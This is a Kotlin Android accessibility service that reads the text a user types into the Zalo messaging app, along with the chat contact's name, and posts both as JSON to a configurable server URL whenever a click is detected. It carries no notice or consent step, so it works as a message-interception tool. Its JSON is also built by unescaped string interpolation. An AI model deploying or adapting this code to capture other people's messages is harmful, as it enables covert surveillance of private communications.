package com.example.cetena1

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class ZaloAccessibilityService : AccessibilityService() {

    private var lastCapturedText: String = ""
    private val client = OkHttpClient()

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.e("ZaloTracker", "✅ DỊCH VỤ OUTBOUND ĐÃ KẾT NỐI!")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: ""
        if (!pkg.contains("zalo")) return

        try {
            when (event.eventType) {
                // Theo dõi thay đổi văn bản
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED, 
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    val rootNode = rootInActiveWindow ?: return
                    val inputText = findInputText(rootNode)
                    if (inputText.isNotBlank()) {
                        lastCapturedText = inputText
                        // Log.d("ZaloTracker", "Captured: $lastCapturedText")
                    }
                }

                // Khi bạn nhấn Gửi
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    Log.d("ZaloTracker", "Phát hiện CLICK trên Zalo")
                    if (lastCapturedText.isNotBlank()) {
                        val rootNode = rootInActiveWindow
                        val name = if (rootNode != null) findContactName(rootNode) else "Người dùng Zalo"
                        
                        Log.e("ZaloTracker", "🚀 Gửi tin đi: $lastCapturedText")
                        sendToMessageCenter(name, lastCapturedText)
                        lastCapturedText = "" 
                    }
                }
            }
        } catch (e: Exception) {
            // Log.e("ZaloTracker", "Error: ${e.message}")
        }
    }

    private fun findInputText(rootNode: AccessibilityNodeInfo): String {
        val ids = arrayOf("com.zing.zalo:id/chat_input_field", "com.vng.zalo:id/chat_input_field")
        for (id in ids) {
            val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
            if (nodes != null && nodes.isNotEmpty()) {
                return nodes[0].text?.toString() ?: ""
            }
        }
        return ""
    }

    private fun findContactName(rootNode: AccessibilityNodeInfo): String {
        val ids = arrayOf("com.zing.zalo:id/chat_title_name", "com.vng.zalo:id/chat_title_name")
        for (id in ids) {
            val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
            if (nodes != null && nodes.isNotEmpty()) {
                return nodes[0].text?.toString() ?: ""
            }
        }
        return "Người dùng Zalo"
    }

    private fun sendToMessageCenter(name: String, message: String) {
        val sharedPref = getSharedPreferences("CetenaPrefs", Context.MODE_PRIVATE)
        val url = sharedPref.getString("server_url", "") ?: ""
        if (url.isBlank()) return

        val json = """{"sender": "$name", "message": "$message", "platform": "ZALO", "direction": "OUTBOUND"}"""
        val body = json.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())

        val request = Request.Builder().url(url).post(body).build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("ZaloTracker", "❌ Gửi thất bại: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                Log.e("ZaloTracker", "✅ ĐÃ GỬI THÀNH CÔNG OUTBOUND!")
                response.close()
            }
        })
    }

    override fun onInterrupt() {}
}